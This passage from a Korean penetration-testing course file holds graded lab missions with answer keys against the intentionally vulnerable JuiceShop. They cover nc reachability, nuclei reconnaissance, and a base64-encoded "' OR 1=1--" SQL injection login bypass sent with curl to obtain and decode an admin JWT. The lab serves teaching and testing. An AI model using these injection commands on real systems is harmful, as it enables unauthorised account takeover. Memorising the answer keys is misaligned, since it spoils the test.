      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
    answer_detail: "기말 종합 침투 점검의 표적 = JuiceShop(juice.el34.lab, 인증/접근제어용 탐지 모드) +
      DVWA(dvwa.el34.lab, 주입 차단 시연용). 이 미션은 fw→web 경로로 표적에 HTTP 응답 코드가 돌아오는지
      확인해 점검 가능 상태(scope alive)를 검증한다. 'juice' 가 출력에 보이면 도달."
    expected_output: |
      juice=200
    verify:
      type: output_contains
      expect: 'juice'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] nc raw (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 ① 정찰 — nuclei 로 기술/보안헤더 자동 매핑
      ## 📖 개념 한 줄
      정찰(Recon)은 본격 점검 전에 표적의 표면(기술 스택·보안 헤더·경로)을 훑어 "어디를 찔러야 하나"의
      지도를 그리는 단계다. 손으로 하나씩 보는 대신 자동 스캐너로 빠르게 다건을 매핑해 속도를 얻는다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) nuclei로 기술 핑거프린팅(tech-detect) + 보안 헤더 누락 템플릿을 함께 던져 표면 자동 매핑(임시파일에 저장→앞 8줄 표시)
      # 2) 저장한 결과 줄 수를 세어 nuclei_findings= 로 출력(발견 건수), 임시파일 정리
      nuclei -u http://juice.el34.lab -t ~/nuclei-templates/http/technologies/tech-detect.yaml -t ~/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt
      # 3) 해석 — 기술 핑거프린팅 + 보안 헤더 누락이 다건 매핑됨(자동 정찰)
      # → 기술 핑거프린팅 + 보안 헤더 누락 자동 매핑(다건 탐지)
      ```
      ## 🔧 도구·옵션 풀이
      - `nuclei` — YAML 템플릿 기반 자동 점검 스캐너. "이런 요청 → 이런 응답이면 이 약점/기술"이라는
        규칙을 템플릿으로 표적에 던진다. 템플릿은 attacker 의 `~/nuclei-templates/` 아래에 있다.
      - `-t .../technologies/tech-detect.yaml` — **기술 핑거프린팅**(표적이 무슨 서버·프레임워크인지).
      - `-t .../misconfiguration/http-missing-security-headers.yaml` — **보안 헤더 누락**(CSP·HSTS 등 미적용 탐지).
      - `tee /tmp/wv15n.txt | head -8` 로 결과를 저장하며 앞 8줄만 보이고, `wc -l` 로 발견 건수를 센다.
      ## ✅ 합격 기준
      `nuclei_findings=` 출력 시 통과. **근거:** 기술/보안헤더 누락이 다건 매핑되어 발견 건수가 나오면
      자동 정찰 수행 — 0 건이면 템플릿 경로·Host 헤더를 재확인한다(악용 가능성은 다음 단계에서 입증).
    hint: 'nuclei 정찰'
    category: recon
    points: 10
    answer: |
      # 1) nuclei로 기술 핑거프린팅(tech-detect) + 보안 헤더 누락 템플릿을 함께 던져 표면 자동 매핑(임시파일에 저장→앞 8줄 표시)
      # 2) 저장한 결과 줄 수를 세어 nuclei_findings= 로 출력(발견 건수), 임시파일 정리
      ssh att@192.168.0.202 'nuclei -u http://juice.el34.lab -t ~/nuclei-templates/http/technologies/tech-detect.yaml -t ~/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml -silent -nc | tee /tmp/wv15n.txt | head -8; echo nuclei_findings=$(wc -l < /tmp/wv15n.txt); rm -f /tmp/wv15n.txt'
      # 3) 해석 — 기술 핑거프린팅 + 보안 헤더 누락이 다건 매핑됨(자동 정찰)
      # → 기술 핑거프린팅 + 보안 헤더 누락 자동 매핑(다건 탐지)
    answer_detail: "정찰 = nuclei 의 기술 핑거프린팅 + 보안 헤더 누락 템플릿으로 표면을 자동 다건 매핑.
      출력 줄 수(nuclei_findings)가 발견 건수다. 자동(속도) 정찰의 결과는 보고서의 Low~Medium 발견이자
      이후 수동(정밀) 점검의 입력이 된다. 'nuclei_findings=' 표식이 출력되면 정찰 수행 인정."
    expected_output: |
      [tech-detect:google-font-api] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:strict-transport-security] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:content-security-policy] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:permissions-policy] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:referrer-policy] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://juice.el34.lab
      [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://juice.el34.lab
      nuclei_findings
    verify:
      type: output_contains
      expect: 'nuclei_findings='
      field: stdout
      semantic:
        intent: "자동 정찰"
        success_criteria: ["기술/헤더 매핑"]
        acceptable_methods: ["**[OSS] nuclei (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 ② 인증 우회 — 로그인 SQLi 로 관리자 JWT 획득
      ## 📖 개념 한 줄
      인증은 가장 치명적인 점검 영역이다. 로그인 쿼리가 입력을 그대로 이어붙이면, 이메일 자리에 넣은
      `' OR 1=1--` 이 조건을 **항상 참**으로 만들어 비밀번호 없이 첫 사용자(관리자)로 로그인된다 — SQLi
      인증 우회(OWASP A07). 성공하면 서버가 JWT(서명된 로그인 토큰)를 발급한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) SQLi 우회 페이로드({"email":"' OR 1=1--",...})를 base64 디코드해 임시 JSON 저장 → juice 로그인 API에 POST → 응답 앞 120자(authentication=우회 성공), 임시파일 정리
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Content-Type: application/json" -d @/tmp/wv15.json http://juice.el34.lab/rest/user/login | head -c 120; rm -f /tmp/wv15.json  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
      echo ""
      ```
      ## 🔧 도구·옵션 풀이
      - 앞의 base64 문자열은 `{"email":"' OR 1=1--","password":"x"}` 를 담은 것 — 이메일 자리에 SQLi
        조각을 넣은 로그인 본문이다. `base64 -d` 로 디코드해 임시 JSON 파일로 만든다.
      - `-d @/tmp/wv15.json` — 그 JSON 을 POST 본문으로 전송, `-H "Content-Type: application/json"` 으로
        JSON 임을 명시. 표적은 JuiceShop 의 로그인 API `/rest/user/login`.
      - `head -c 120` — 응답 앞부분만 확인(토큰 구조가 보이는지). 끝에 임시 파일을 정리한다.
      ## ✅ 합격 기준
      `authentication` 출력 시 통과. **근거:** 응답 본문에 authentication(토큰을 담은 구조)이 나타나면
      비밀번호 없이 관리자로 로그인된 인증 우회 성공(얻은 권한으로 데이터를 조작하지 않음 — 입증까지만).
    hint: "' OR 1=1-- → token"
    category: manipulation
    points: 12
    answer: |
      # 1) SQLi 우회 페이로드({"email":"' OR 1=1--",...})를 base64 디코드해 임시 JSON 저장 → juice 로그인 API에 POST → 응답 앞 120자(authentication=우회 성공), 임시파일 정리
      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json; curl -s -H "Content-Type: application/json" -d @/tmp/wv15.json http://juice.el34.lab/rest/user/login | head -c 120; rm -f /tmp/wv15.json'  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
      echo ""
    answer_detail: "인증 우회 = 로그인 API 이메일 자리에 ' OR 1=1-- 를 주입 → 조건이 항상 참이 되어
      관리자 JWT 발급(OWASP A07 식별·인증 실패). 응답에 'authentication'(토큰 구조)이 보이면 우회 성공.
      위험 평가에서 무인증·원격·쉬운 악용이라 9.8 Critical, 근본 방어는 parameterized query."
    expected_output: |
      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5
    verify:
      type: output_contains
      expect: 'authentication'
      field: stdout
      semantic:
        intent: "인증 우회"
        success_criteria: ["token"]
        acceptable_methods: ["**[OSS] login SQLi (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 ② JWT 분석 — payload 노출 확인
      ## 📖 개념 한 줄
      JWT 는 `헤더.payload.서명` 세 조각이 점(.)으로 이어진 토큰이다. 가운데 **payload 는 암호화가
      아니라 단순 base64 인코딩**일 뿐이라, 누구나 디코드해 안의 값(이메일·권한)을 읽을 수 있다 — payload
      에 민감 정보를 담으면 그 자체가 정보 노출(A02)이다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) (인증 우회와 동일) 페이로드를 base64 디코드해 임시 JSON 저장 → 로그인 응답에서 token 추출(sed) → 가운데 칸(payload)만 잘라(cut) base64url→base64 치환(tr) 후 디코드(앞 200자)
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv15.json
      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/wv15.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d | head -c 200; rm -f /tmp/wv15.json
      echo ""
      ```
      ## 🔧 도구·옵션 풀이
      - 미션 3 처럼 인증 우회로 로그인하되, `sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"` 로 응답에서
        `token` 값만 추출해 변수 `T` 에 담는다.
      - `cut -d. -f2` — JWT 의 **두 번째 조각(payload)** 만 잘라낸다(점 기준 2번째).
      - `tr "_-" "/+"` — JWT 는 base64**url** 변형이라 `-`/`_` 를 표준 base64 의 `+`/`/` 로 되돌린 뒤
        `base64 -d` 로 디코드한다. `head -c 200` 으로 앞부분만 본다.
      ## ✅ 합격 기준
      `email` 출력 시 통과. **근거:** 디코드 결과에 email 등 payload 필드가 보이면 서명 검증 전 평문
      노출 입증 — 깨지면 token 추출과 base64url→base64 변환(`-`/`_`→`/`/`+`)을 점검한다.
    hint: 'JWT 디코드'
    category: analysis
